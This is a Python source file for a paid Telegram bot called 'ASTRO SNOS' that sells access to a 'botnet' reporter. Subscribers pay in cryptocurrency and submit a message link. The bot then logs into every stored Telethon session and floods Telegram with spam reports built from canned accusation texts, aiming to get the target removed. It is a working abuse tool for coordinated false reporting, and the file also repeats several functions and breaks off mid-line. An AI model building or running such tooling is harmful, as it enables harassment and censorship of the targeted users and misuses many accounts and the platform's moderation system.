from config import *
from config import api_token, log_chat_id, Crypto_Pay_API_Token, sessions_folder
import sqlite3
import logging
from datetime import datetime, timedelta
from decimal import Decimal
import random
import string
import time
import telebot as tb
from telebot import types
import sqlite3
import datetime
from datetime import datetime, timedelta
import os
import json
import re
from telethon import TelegramClient, errors
from telethon.errors import FloodError, PeerFloodError, SessionPasswordNeededError
from telethon.tl.functions.messages import ReportSpamRequest
from telethon.tl.types import PeerUser, PeerChat, PeerChannel
import asyncio
import time
from threading import Timer
import random 
from asyncio import Semaphore, sleep
import threading
import aiogram
import psutil
from telebot import TeleBot
from aiogram import Bot, Dispatcher, types
from aiogram.types import Message
from aiogram import executor
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram import types
from aiogram.utils.exceptions import ChatNotFound
import asyncio
import re
from aiogram.types import ParseMode
from aiogram import executor
import aiosqlite
import json
import random
from aiogram.types import ChatMemberAdministrator, ChatMemberOwner
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext
from aiogram.types import CallbackQuery
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
import asyncio 
import math
import requests
import aiohttp
import threading
import asyncio
import os
from termcolor import colored
from telethon.sync import TelegramClient
from telethon.tl.functions.messages import ReportRequest
import random
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.errors import SessionPasswordNeededError
from telethon.errors import PhoneCodeInvalidError, PhoneNumberInvalidError, FloodWaitError
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError, FloodWaitError
from telethon.tl.types import Channel, Chat, InputPeerChannel, InputPeerChat
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import InputReportReasonOther, InputReportReasonSpam, Channel, Chat
import aiosqlite

def create_database(): 
    conn = sqlite3.connect('database.db', check_same_thread=False)
    cursor = conn.cursor()


    cursor.execute(''' 
        CREATE TABLE IF NOT EXISTS users ( 
            id INTEGER PRIMARY KEY, 
            user_id INTEGER UNIQUE, 
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            timeout DATETIME,
            white_list TEXT
        ) 
    ''')
    cursor.execute(''' 
        CREATE TABLE IF NOT EXISTS api ( 
            api_id TEXT,
            api_hash TEXT,
            session TEXT
        ) 
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS promocodes (
            id INTEGER PRIMARY KEY,
            code TEXT UNIQUE NOT NULL,
            days_subscription INTEGER NOT NULL,
            max_activations INTEGER NOT NULL,
            activations_count INTEGER DEFAULT 0,
            used_by TEXT  
        );
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS subscriptions (
            user_id INTEGER PRIMARY KEY,
            expiration_date DATETIME
        );
    ''')
    
    conn.commit()
    
create_database()

class GiveSubState(StatesGroup):
    WaitingForUserData = State()
    White = State()
    Spam = State()

# ....... хз
COOLDOWN_TIME = 1500 # 5 минут

# Хранилище кулдаунов пользователей
user_cooldowns = {}
bot = Bot(token=api_token)
logging.basicConfig(level=logging.INFO)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
semaphore = Semaphore(5)
session_locks = {}
lock = asyncio.Lock()


async def check_user(user_id):
    db_path = os.path.join(os.getcwd(), 'database.db')

    try:
        conn = sqlite3.connect(db_path)
        conn.execute('PRAGMA busy_timeout = 3000')  # Устанавливаем таймаут ожидания в 3 секунды
        cursor = conn.cursor()

        cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        existing_user = cursor.fetchone()

        if existing_user:
            return True
        else:
            cursor.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
            conn.commit()

            # Отправка сообщения о новом пользователе
            try:
                await bot.send_message(
                    log_chat_id,
                    f'<b>👤 Зарегистрирован новый <a href="tg:/openmessage?user_id={user_id}">пользователь</a></b>\nID: <code>{user_id}</code>',
                    parse_mode='HTML'
                )
            except aiogram.utils.exceptions.ChatNotFound:
                print(f"Ошибка: log_chat_id={log_chat_id} недоступен.")
            except Exception as e:
                print(f"Неизвестная ошибка при отправке сообщения: {e}")

            return False
    except sqlite3.Error as e:
        print(f"Ошибка базы данных: {e}")
        return False
    finally:
        conn.close()


async def check_subcribe_status(id):
    conn = sqlite3.connect('database.db', check_same_thread=False)
    cursor = conn.cursor()

    # Проверка наличия данных в базе для пользователя
    cursor.execute("SELECT expiration_date FROM subscriptions WHERE user_id=?", (id,))
    subscription = cursor.fetchone()

    # Получаем информацию о белом списке
    cursor.execute("SELECT white_list FROM users WHERE user_id = ?", (id,))
    white_data = cursor.fetchone()

    # Если белый список не пустой, присваиваем значение "Присутствует", иначе "Отсутствует"
    if white_data:
        white = "Присутствует" if white_data[0] else "Отсутствует"
    else:
        white = "Отсутствует"

    # Получаем информацию о чате
    chat = await bot.get_chat(id)
    name = chat.full_name
    username = chat.username
    if username:
        username = f"/ @{username}"
    else:
        username = ""

    # Проверка подписки
    if subscription:
        expiration_date = subscription[0]
        date = datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S.%f')
        current_date = datetime.now()
        if current_date <= date:
            status = f"<b>📱 Ваш профиль\n\n🗣 Имя: {name}\n🗂 Информация: id {id} {username}\n💎 Подписка до: {date}"
        else:
            status = f"<b>📱 Ваш профиль\n\n🗣 Имя: {name}\n🗂 Информация: id {id} {username}\n💎 Подписка: Закончилась❌"
    else:
        status = f"<b>📱 Ваш профиль\n\n🗣 Имя: {name}\n🗂 Информация: id {id} {username}\n💎 Подписка: Отсутствует❌"

    conn.close()  # Закрытие соединения с базой данных
    return status

async def subscribe_check(user_id):
    async with aiosqlite.connect('database.db') as conn:
        await conn.execute('PRAGMA busy_timeout = 3000')
        async with conn.cursor() as cursor:
            await cursor.execute("SELECT expiration_date FROM subscriptions WHERE user_id=?", (user_id,))
            subscription = await cursor.fetchone()

            if subscription:
                expiration_date = datetime.strptime(subscription[0], '%Y-%m-%d %H:%M:%S.%f')
                return datetime.now() <= expiration_date
            return False


@dp.message_handler(commands=['start'])
async def home(message: types.Message):
    if message.chat.type != types.ChatType.PRIVATE:
        return

    check_subscription = await subscribe_check(message.from_user.id)

    # Маркеры для кнопок
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("💸Buy botnet", callback_data="buy"))

    # Дополнительные кнопки
    button = types.InlineKeyboardMarkup(row_width=2)
    profile = types.InlineKeyboardButton(text="✅Профиль", callback_data="profile")
    botnet = types.InlineKeyboardButton("☠️Репортер", callback_data="botnet")
    channel = types.InlineKeyboardButton("🔔Канал", url="https://t.me/+bOH5fsLwqy80ZTM1")

    button.add(profile, botnet, channel)

    if check_subscription:
        # Пользователь с подпиской — отправляем с баннером и меню
        with open('net1.png', 'rb') as banner1:
            await bot.send_photo(
                chat_id=message.from_user.id,
                photo=banner1,
                caption='<b>welcome to ASTRO SNOS 👏</b>',
                reply_markup=button,
                parse_mode='HTML'
            )
    else:
        # Пользователь без подписки — отправляем баннер с предложением купить подписку
        with open('net1.png', 'rb') as banner2:
            await bot.send_photo(
                chat_id=message.from_user.id,
                photo=banner2,
                caption='<b>❌ У вас отсутствует подписка! Приобретите её по кнопке ниже.</b>',
                reply_markup=markup,
                parse_mode='HTML'
            )
@dp.callback_query_handler(lambda call: call.data == 'profile')
async def profile(call: types.CallbackQuery):
    user_id = call.from_user.id  # Получаем ID пользователя
    user_name = call.from_user.full_name  # Получаем имя пользователя

    # Проверяем, есть ли у пользователя подписка
    has_subscription = await subscribe_check(user_id)

    # Формируем текст сообщения
    subscription_status = "есть" if has_subscription else "нету"
    message_text = (
        f"💎 Имя : {user_name}\n"
        f"🆔 Id : {user_id}\n"
        f"👨‍💻 Подписка : {subscription_status}"
    )

    # Отправляем новое сообщение
    await bot.send_message(
        chat_id=call.message.chat.id,  # ID чата, куда отправляем сообщение
        text=message_text  # Текст сообщения
    )
        
@dp.callback_query_handler(lambda call: call.data == 'buy')
async def buy(call: types.CallbackQuery):
    markup = types.InlineKeyboardMarkup()
    subscription_options = [
        ("💳 7 дней - 2$", "buy_7"),
        ("💳 31 день - 4$", "buy_31"),
        ("💳 365 день - 9$", "buy_365"),
        ("💳 Навсегда - 12$", "lifetime"),
        ("Назад", "back")
    ]
    for option_text, callback_data in subscription_options:
        markup.add(types.InlineKeyboardButton(option_text, callback_data=callback_data))
    
    await bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption="<b>💎 Оплата через @send\n⌛️ Выберите срок подписки:</b>\n🤝Оплата по карте или тг кошельку писать \n🔰@fucking_goose \n🔰@pplmaycry",
        reply_markup=markup,
        parse_mode="HTML"
    )



@dp.callback_query_handler(lambda call: call.data == 'back')
async def back_to_main(call: types.CallbackQuery, state: FSMContext):
    # Проверка статуса подписки
    check_subscription = await subscribe_check(call.from_user.id)

    # Маркеры для кнопок
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("💸Buy botnet", callback_data="buy"))
    markup.add(types.InlineKeyboardButton(f"✅Профиль", callback_data=f"profile"))

    # Дополнительные кнопки
    button = types.InlineKeyboardMarkup(row_width=2)
    profile = types.InlineKeyboardButton(text="✅Профиль", callback_data="profile")
    botnet = types.InlineKeyboardButton("☠️Репортер", callback_data="botnet")
    channel = types.InlineKeyboardButton("🔔Канал", url="https://t.me/+bOH5fsLwqy80ZTM1")

    button.add(profile, botnet, channel)
    
    # Получение статуса подписки
    if check_subscription:
        # Пользователь с подпиской — отправляем с баннером и меню
        with open('net1.png', 'rb') as banner1:
            await bot.send_photo(
                chat_id=call.from_user.id,
                photo=banner1,
                caption='<b>welcome to ASTRO SNOS👏</b>',
                reply_markup=button,
                parse_mode='HTML'
            )
    else:
        # Пользователь без подписки — отправляем баннер с предложением купить подписку
        with open('net1.png', 'rb') as banner2:
            await bot.send_photo(
                chat_id=call.from_user.id,
                photo=banner2,
                caption='<b>❌ У вас отсутствует подписка! Приобретите её по кнопке ниже.</b>',
                reply_markup=markup,
                parse_mode='HTML'
            )


		
	
   

async def generate_payment_link(payment_system, amount):
    api_url = "https://pay.crypt.bot/api/createInvoice"
    headers = {"Crypto-Pay-API-Token": Crypto_Pay_API_Token}
    data = {
        "asset": payment_system,
        "amount": float(amount)
    }

    response = requests.post(api_url, headers=headers, json=data)
    if response.status_code == 200:
        json_data = response.json()
        invoice = json_data.get("result")
        payment_link = invoice.get("pay_url")
        invoice_id = invoice.get("invoice_id")
        return payment_link, invoice_id
    else:
        return None, None

async def get_invoice_status(invoice_id):
    api_url = f"https://pay.crypt.bot/api/getInvoices?invoice_ids={invoice_id}"
    headers = {"Crypto-Pay-API-Token": Crypto_Pay_API_Token}

    response = requests.get(api_url, headers=headers)
    if response.status_code == 200:
        json_data = response.json()
        if json_data.get("ok"):
            invoices = json_data.get("result")
            if invoices and 'items' in invoices and invoices['items']:
                status = invoices['items'][0]['status']
                payment_link = invoices['items'][0]['pay_url']
                amount = Decimal(invoices['items'][0]['amount'])
                value = invoices['items'][0]['asset']
                return status, payment_link, amount, value

    return None, None, None, None

async def get_exchange_rates():
    api_url = "https://pay.crypt.bot/api/getExchangeRates"
    headers = {"Crypto-Pay-API-Token": Crypto_Pay_API_Token}

    response = requests.get(api_url, headers=headers)
    if response.status_code == 200:
        json_data = response.json()
        if json_data.get("ok"):
            return json_data["result"]
    return []

async def convert_to_crypto(amount, asset):
    rates = await get_exchange_rates()
    rate = None
    for exchange_rate in rates:
        if exchange_rate["source"] == asset and exchange_rate["target"] == 'USD':
            rate = Decimal(str(exchange_rate["rate"]))
            break

    if rate is None:
        raise Exception(f"<b>🎲 Не удалось найти курс обмена для {asset}</b>", parse_mode="HTML")

    amount = Decimal(str(amount))
    return amount / rate 
    
    
@dp.callback_query_handler(lambda call: call.data.startswith('buy_'))
async def subscription_duration_selected(call: types.CallbackQuery):
    duration = call.data
    markup = types.InlineKeyboardMarkup()
    currency_options = [
        ("💵 USDT", "currency_USDT_" + duration),
        ("💎 TON", "currency_TON_" + duration),
        ("💰 NOT", "currency_NOT_" + duration),
        ("🪙 BTC", "currency_BTC_" + duration),
        ("💶 ETH", "currency_ETH_" + duration),
        ("Назад", "buy")
    ]
    for option_text, callback_data in currency_options:
        markup.add(types.InlineKeyboardButton(option_text, callback_data=callback_data))
    
    await bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption="<b>💸  Выберите валюту для оплаты:</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )
    
@dp.callback_query_handler(lambda call: call.data.startswith('currency_'))
async def currency_selected(call: types.CallbackQuery):
    parts = call.data.split('_')
    currency = parts[1]
    duration_parts = parts[2:]
    duration = "_".join(duration_parts)

    amount = get_amount_by_duration(duration.replace('buy_', ''))

    try:
        converted_amount = await convert_to_crypto(amount, currency)
        payment_link, invoice_id = await generate_payment_link(currency, converted_amount)
        if payment_link and invoice_id:
            markup = types.InlineKeyboardMarkup()
            oplata = types.InlineKeyboardButton("💰  Оплатить", url=f"{payment_link}")
            check_payment_button = types.InlineKeyboardButton("💸  Проверить оплату", callback_data=f"check_payment:{call.from_user.id}:{invoice_id}")
            markup.add(oplata, check_payment_button)
            
            await bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=f"<b>💸  Счет для оплаты:</b>\n{payment_link}",
                reply_markup=markup,
                parse_mode="HTML"
            )
        else:
            await bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="<b>❌  Не удалось создать счет для оплаты. Пожалуйста, попробуйте позже.</b>",
                parse_mode="HTML"
            )
    except Exception as e:
        await bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=str(e)
        )

def get_amount_by_duration(duration):
    prices = {
        '1': 1,
        '7': 2,
        '31': 4,
        '365': 9,
        'lifetime': 12
    }
    return prices.get(duration, 0)
    
  
@dp.callback_query_handler(lambda call: call.data.startswith('check_payment:'))
async def check_payment(call: types.CallbackQuery):
    _, user_id_str, invoice_id_str = call.data.split(':')
    user_id = int(user_id_str)
    invoice_id = invoice_id_str
    
    if user_id == call.from_user.id:
        status, payment_link, amount, value = await get_invoice_status(invoice_id)
        
        if status == "paid":
            duration_days = get_duration_by_amount(amount)
            
            expiration_date = datetime.now() + timedelta(days=duration_days)
            await add_subscription(user_id, expiration_date)
            await bot.send_message(
                log_chat_id,
                f"<b>💸 Была <a href='tg:/openmessage?user_id={user_id}'>куплена</a> подписка\n==========</b>\n"
                f"<b>Покупатель: {user_id}</b>\n"
                f"<b>Количество дней: {duration_days}</b>\n"
                f"<b>Статус:</b> {status}\n"
                f"<b>Ссылка для оплаты:</b> {payment_link}\n"
                f"<b>Цена:</b> {amount} {value}",
                parse_mode="HTML"
            )
            await bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id, 
                caption="<b>✅ Оплата подтверждена! Подписка активирована. Спасибо за покупку.</b>",
                parse_mode="HTML"
            )
            await home(call.message)
        else:
            await bot.answer_callback_query(call.id, "❌ Оплата не найдена. Попробуйте позже!")
    else:
        await bot.answer_callback_query(call.id, "❌ Вы не можете проверить эту оплату.", show_alert=True)

def get_duration_by_amount(amount):
    amount = round(amount, 1)
    if amount <= 1:
        return 1
    elif amount <= 2:
        return 7
    elif amount <= 4:
        return 31
    elif amount <= 9:
        return 365
    elif amount <= 12:
        return 365 * 99  
    else:
        return 0
        
        
class MyState(StatesGroup):
	link = State()
	promo = State()
	delete = State()
 
 
        
        
async def subscribe_check(user_id):
    conn = sqlite3.connect('database.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT expiration_date FROM subscriptions WHERE user_id=?", (user_id,))
    subscription = cursor.fetchone()
    conn.close()
    return subscription is not None and datetime.now() <= datetime.strptime(subscription[0], '%Y-%m-%d %H:%M:%S.%f')

# Обработчик для кнопки "Промокод"
@dp.callback_query_handler(lambda call: call.data == 'promo')
async def handle_inline_button_click2(call: types.CallbackQuery):
    # Проверяем, есть ли у пользователя подписка
    if not await subscribe_check(call.from_user.id):
        await call.message.reply("<b>❌️ У вас нет активной подписки! Промокод доступен только для подписчиков.</b>", parse_mode="HTML")
        return

    with open('net1.png', 'rb') as had:
        await bot.send_photo(call.message.chat.id, had, "<b> Введите промокод в чат:</b>", parse_mode="HTML")
    await MyState.promo.set()

# Функция для проверки, был ли использован промокод
def is_user_in_promocode(user_id, promo_code):
    with sqlite3.connect('database.db', check_same_thread=False) as conn:
        cursor = conn.cursor()

        user_id_str = str(user_id)

        cursor.execute('''
            SELECT 1
            FROM promocodes
            WHERE code = ?
            AND (
                used_by = ? OR                  -- ID единственный в поле
                used_by LIKE ? OR               -- ID в начале
                used_by LIKE ? OR               -- ID в конце
                used_by LIKE ?                  -- ID в середине
            )
        ''', (
            promo_code,
            user_id_str,
            f'{user_id_str},%',
            f'%,{user_id_str}',
            f'%,{user_id_str},%'
        ))

        result = cursor.fetchone()
        return result is not None

# Обработчик для ввода промокода
@dp.message_handler(state=MyState.promo)
async def soso(message: types.Message, state: FSMContext):
    try:
        # Проверяем, есть ли у пользователя подписка
        if not await subscribe_check(message.from_user.id):
            await message.reply("<b>❌️ У вас нет активной подписки! Промокод доступен только для подписчиков.</b>", parse_mode="HTML")
            await home(message)
            await state.finish()
            return

        with sqlite3.connect('database.db') as conn:
            cursor = conn.cursor()

            # Проверяем, существует ли промокод
            cursor.execute("SELECT * FROM promocodes WHERE code = ?", (message.text,))
            promocode = cursor.fetchone()

            # Проверяем, есть ли у пользователя подписка и находим дату окончания
            cursor.execute("SELECT expiration_date FROM subscriptions WHERE user_id = ?", (message.from_user.id,))
            expiration_date = cursor.fetchone()

            if expiration_date and expiration_date[0]:
                expiration_date = datetime.strptime(expiration_date[0], '%Y-%m-%d %H:%M:%S.%f')
            else:
                expiration_date = datetime.now()

            # Если промокод существует
            if promocode is not None:
                already_used = is_user_in_promocode(message.from_user.id, message.text)

                if already_used:
                    await message.reply("<b>❌️ Вы уже использовали данный промокод.</b>", parse_mode="HTML")
                    await home(message)
                    await state.finish()
                    return
                elif promocode[4] >= promocode[3]:
                    await message.reply("<b>❌️ Данный промокод использовали макс. количество раз.</b>", parse_mode="HTML")
                    await home(message)
                    await state.finish()
                    return
                else:
                    # Обновляем срок подписки
                    new_expiration_date = expiration_date + timedelta(days=promocode[2])
                    new_expiration_date_str = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S.%f')

                    # Обновляем или вставляем дату окончания подписки
                    cursor.execute("INSERT OR REPLACE INTO subscriptions (user_id, expiration_date) VALUES (?, ?)", (message.from_user.id, new_expiration_date_str))

                    # Обновляем промокод и увеличиваем количество использований
                    cursor.execute('''
                        UPDATE promocodes 
                        SET used_by = 
                            CASE 
                                WHEN used_by IS NULL OR used_by = '' THEN ?
                                ELSE used_by || ',' || ? 
                            END,
                            activations_count = activations_count + 1
                        WHERE id = ?
                    ''', (str(message.from_user.id), str(message.from_user.id), promocode[0]))

                    conn.commit()

                    # Отправляем сообщение о продлении подписки
                    await message.reply(f"<b>✅️ Подписка продлена на {promocode[2]} дней!</b>", parse_mode="HTML")

                    # Логируем активированный промокод
                    await bot.send_message(
                        log_chat_id,
                        f"🩸 <a href='tg:/openmessage?user_id={message.from_user.id}'>Пользователь</a> ввел промокод <code>{message.text}</code>\n"
                        f"<b>🔔 Дни подписки:</b> <code>{promocode[2]}</code>\n"
                        f"<b>🔔 Осталось активаций:</b> <code>{promocode[3] - (1 + promocode[4])}</code>",
                        parse_mode="HTML"
                    )

                    await home(message)
                    await state.finish()

            else:
                await message.reply("<b>❌️ Неверный промокод.</b>", parse_mode="HTML")
                await home(message)
                await state.finish()

    except sqlite3.Error as e:
        print(f"Ошибка при обработке промокода: {e}")
        await message.reply("<b>❌️ Ошибка при обработке промокода.</b>", parse_mode="HTML")
        await home(message)
        await state.finish()
        
        
def load_bypass_users():
    try:
        with open("owner.txt", "r") as file:
            return set(int(line.strip()) for line in file if line.strip().isdigit())
    except FileNotFoundError:
        return set()

# Сохранение списка исключений в файл
def save_bypass_users():
    with open("owner.txt", "w") as file:
        for user_id in bypass_users:
            file.write(f"{user_id}\n")

# Инициализация списка исключений
bypass_users = load_bypass_users()         

# Обработчик для команды botnet
@dp.callback_query_handler(lambda call: call.data == 'botnet')
async def botnet(call: types.CallbackQuery, state: FSMContext):
    user_id = call.from_user.id  # ID пользователя
    chat_id = call.message.chat.id  # ID чата, в котором отправлена команда

    # Проверяем, является ли пользователь в списке исключений
    if user_id in bypass_users:
        # Если пользователь в списке исключений — пропускаем кулдаун
        await call.message.answer(
            "У вас нет ограничений на использование команды.",
            parse_mode="HTML"
        )
    else:
        # Проверка кулдауна для обычных пользователей
        current_time = time.time()
        if user_id in user_cooldowns:
            last_used = user_cooldowns[user_id]
            time_left = COOLDOWN_TIME - (current_time - last_used)
            if time_left > 0:
                minutes, seconds = divmod(int(time_left), 60)
                await call.message.answer(
                    f"⏳ Подождите {minutes} минут и {seconds} секунд перед следующим использованием команды.",
                    parse_mode="HTML"
                )
                return

        # Сохраняем текущее время использования команды
        user_cooldowns[user_id] = current_time

    # Проверка подписки
    if not await subscribe_check(call.from_user.id):
        await state.finish()
        return

    # Отправляем сообщение для ввода ссылки
    await call.message.answer("<b>Отправьте ссылку на нарушение в публичном канале/чате: </b>", parse_mode="HTML")
    await MyState.link.set()
	
session_locks = {}
lock = asyncio.Lock()
	

report_texts = [
    "Сообщение похоже на спам, и его присутствие в чате нежелательно. Просьба принять необходимые меры для его удаления.",
    "Содержимое данного сообщения нарушает правила сообщества. Рекомендуется оперативное вмешательство со стороны модераторов.",
    "Сообщение содержит недопустимый контент, который противоречит установленным нормам. Просим удалить его как можно скорее.",
    "В тексте сообщения замечены признаки спама. Предлагается его удалить, чтобы избежать дальнейшего распространения.",
    "Данное сообщение является явным спамом. Просим незамедлительно принять соответствующие меры по его удалению.",
    "Сообщение содержит элементы спама, что нарушает правила платформы. Пожалуйста, примите меры по его блокировке.",
    "Контент сообщения явно нарушает политику сервиса, поэтому требуется его проверка и принятие соответствующих мер.",
    "Этот контент противоречит правилам использования Telegram. Просим обратить внимание и принять меры по его удалению.",
    "Сообщение вызывает подозрения и может содержать потенциально опасный контент. Рекомендуется его проверить на наличие нарушений.",
    "Пожалуйста, удалите это сообщение, так как оно содержит явные признаки спама и может вводить пользователей в заблуждение.",
    "Обнаружено явное нарушение правил сообщества в содержании сообщения. Просим модераторов рассмотреть этот случай.",
    "Сообщение нарушает основные правила сервиса. Рекомендуется принять соответствующие меры для устранения нарушения.",
    "Текст сообщения содержит нежелательный контент, который противоречит нормам платформы. Просим удалить его.",
    "Данное сообщение вызывает серьезные подозрения в мошенничестве. Просим провести проверку и принять меры в случае подтверждения.",
    "Сообщение нарушает условия использования сервиса и может негативно повлиять на пользователей. Требуется вмешательство.",
    "Обратите внимание на это сообщение, так как оно может содержать спам или недопустимый контент. Просим проверить его.",
    "Содержимое сообщения не соответствует стандартам сообщества и вызывает беспокойство. Рекомендуется его удалить.",
    "В тексте сообщения содержится информация, которая может быть обманчивой или нарушающей правила. Просим провести проверку.",
    "Сообщение содержит оскорбительный или неподобающий контент, что недопустимо. Требуется вмешательство со стороны модераторов."
]

# Функция для проверки подписки
async def subscribe_check(user_id):
    conn = sqlite3.connect('database.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT expiration_date FROM subscriptions WHERE user_id=?", (user_id,))
    subscription = cursor.fetchone()
    conn.close()
    if subscription:
        expiration_date = datetime.strptime(subscription[0], '%Y-%m-%d %H:%M:%S.%f')
        return datetime.now() <= expiration_date
    return False

# Обработчик для команды botnet
@dp.callback_query_handler(lambda call: call.data == 'botnet')
async def botnet(call: types.CallbackQuery, state: FSMContext):
    user_id = call.from_user.id  # ID пользователя
    chat_id = call.message.chat.id  # ID чата, в котором отправлена команда

    # Проверяем, является ли пользователь в списке исключений
    if user_id in bypass_users:
        # Если пользователь в списке исключений — пропускаем кулдаун
        await call.message.answer(
            "У вас нет ограничений на использование команды.",
            parse_mode="HTML"
        )
    else:
        # Проверка кулдауна для обычных пользователей
        current_time = time.time()
        if user_id in user_cooldowns:
            last_used = user_cooldowns[user_id]
            time_left = COOLDOWN_TIME - (current_time - last_used)
            if time_left > 0:
                minutes, seconds = divmod(int(time_left), 60)
                await call.message.answer(
                    f"⏳ Подождите {minutes} минут и {seconds} секунд перед следующим использованием команды.",
                    parse_mode="HTML"
                )
                return

        # Сохраняем текущее время использования команды
        user_cooldowns[user_id] = current_time

    # Проверка подписки
    if not await subscribe_check(call.from_user.id):
        await state.finish()
        return

    # Отправляем сообщение для ввода ссылки
    await call.message.answer("<b>Отправьте ссылку на нарушение в публичном канале/чате: </b>", parse_mode="HTML")
    await MyState.link.set()

# Проверка использования промокода
def is_user_in_promocode(user_id, promo_code):
    with sqlite3.connect('database.db', check_same_thread=False) as conn:
        cursor = conn.cursor()
        user_id_str = str(user_id)
        cursor.execute('''
            SELECT 1
            FROM promocodes
            WHERE code = ?
            AND (
                used_by = ? OR
                used_by LIKE ? OR
                used_by LIKE ? OR
                used_by LIKE ?
            )
        ''', (
            promo_code,
            user_id_str,
            f'{user_id_str},%',
            f'%,{user_id_str}',
            f'%,{user_id_str},%'
        ))

        result = cursor.fetchone()
        return result is not None

# Асинхронная функция для отправки жалобы
async def send_complaint(client, peer, message_id):
    try:
        await client(ReportRequest(peer, id=[int(message_id)], reason=InputReportReasonSpam(),
                                    message=random.choice(report_texts)))
        return True
    except Exception as e:
        print(f"Ошибка при отправке жалобы с сессии {client.session.filename}: {e}")
        return False


@dp.message_handler(state=MyState.link)
async def links(message: types.Message, state: FSMContext):
    link = str(message.text)
    conn = sqlite3.connect('database.db', check_same_thread=False)
    cursor = conn.cursor()

    print(f"Получена ссылка от пользователя {message.from_user.id}: {link}")

    if not str(link).startswith("https://t.me/") or str(link).startswith("https://t.me/c/"):
        await message.answer("<b>❌️ Введите правильную ссылку (публичный чат или канал)</b>", parse_mode="HTML")
        await state.finish()
        await home(message)
        print("Неверная ссылка, возвращаем на главный экран.")
        return

    if '/' not in link:
        await message.answer("<b>❌️ Ссылка должна содержать ID сообщения. Например: https://t.me/chat/123456</b>", parse_mode="HTML")
        await state.finish()
        await home(message)
        print("Ссылка не содержит ID сообщения.")
        return

    if len(link) > 80:
        await message.answer("<b>❌️ Ваша ссылка слишком длинная!</b>")
        await state.finish()
        await home(message)
        print("Ссылка слишком длинная.")
        return

    chat = link.split("/")[-2]
    message_id = link.split("/")[-1]

    print(f"Обрабатываем жалобы для чата: {chat}, сообщение ID: {message_id}")

    await message.answer("<b>Обрабатываем жалобы...</b>", parse_mode="HTML")
    await state.finish()

    failed_sessions = 0
    successful_sessions = 0

    cursor.execute("SELECT white_list FROM users")
    white_list = [row[0] for row in cursor.fetchall()]

    # Create a list to collect tasks for parallel processing
    tasks = []

    # Обработка сессий
    async def process_session(session_file):
        nonlocal successful_sessions, failed_sessions

        session_path = os.path.join(sessions_folder, session_file)
        print(f"Обработка сессии {session_file}")

        if not os.path.exists(session_path):
            print(f"Сессия {session_file} не найдена.")
            return

        if not session_file.endswith('.session'):
            print(f"Сессия {session_file} не имеет окончания .session.")
            return

        if session_file not in session_locks:
            session_locks[session_file] = asyncio.Lock()

        async with session_locks[session_file]:
            connected = False
            session2 = session_file.split('.')[0]
            try:
                cursor.execute('SELECT api_id, api_hash FROM api WHERE session = ?', (session2,))
                api = cursor.fetchone()
                if api is None:
                   print(f"Ошибка: сессия {session_file} не найдена в базе данных.")
                   failed_sessions += 1
                   return
                api_id = int(api[0])
                api_hash = str(api[1])
            except Exception as e:
                print(f"Ошибка при получении API для сессии {session_file}: {e}")
                failed_sessions += 1
                return

            print(f"Подключение сессии {session_file} с API_ID: {api_id}")

            client = TelegramClient(session_path, api_id=api_id, api_hash=api_hash, auto_reconnect=True)

            try:
                await client.connect()
                if await client.is_user_authorized():
                    connected = True
                    print(f"Сессия {session_file} подключена и авторизована.")
                else:
                    failed_sessions += 1
                    print(f"Сессия {session_file} не авторизована.")
                    return

                try:
                    entity = await client.get_entity(chat)
                    peer = await client.get_input_entity(entity)

                    if isinstance(entity, (Channel, Chat)):
                        try:
                            message_info = await client.get_messages(entity, ids=int(message_id))

                            if message_info:
                                from_id = message_info.sender_id
                                print(f"Сообщение найдено от {from_id}.")

                                if int(from_id) in white_list or int(from_id) in admin:
                                    failed_sessions += 1
                                    print(f"Сообщение от пользователя {from_id} в белом списке, пропускаем.")
                                    return

                                # Use asyncio.gather to send complaints in parallel
                                all_sent = await asyncio.gather(
                                    *[send_complaint(client, peer, message_id) for _ in range(count)]
                                )

                                if all(all_sent):
                                    successful_sessions += 1
                                    print(f"Жалоба успешно отправлена с сессии {session_file}.")
                                else:
                                    failed_sessions += 1
                                    print(f"Не удалось отправить жалобу с сессии {session_file}.")
                            else:
                                failed_sessions += 1
                                print(f"Сообщение с ID {message_id} не найдено.")
                                return

                        except Exception as e:
                            failed_sessions += 1
                            print(f"Ошибка при получении сообщения с сессии {session_file}: {e}")

                except Exception as e:
                    failed_sessions += 1
                    print(f"Ошибка при получении сущности с сессии {session_file}: {e}")

            finally:
                await client.disconnect()
                print(f"Сессия {session_file} отключена.")

    # Add all session processing tasks to the tasks list
    for session_file in os.listdir(sessions_folder):
        if session_file.endswith('.session'):
            tasks.append(process_session(session_file))

    await asyncio.gather(*tasks)


    print(f"Отправка завершена: успешных сессий - {successful_sessions}, неудачных - {failed_sessions}")

    await message.answer(f"<b>✅️ Отправка завершена!</b>\n"
                         f"🩸 Успешно отправлены: {successful_sessions}\n"
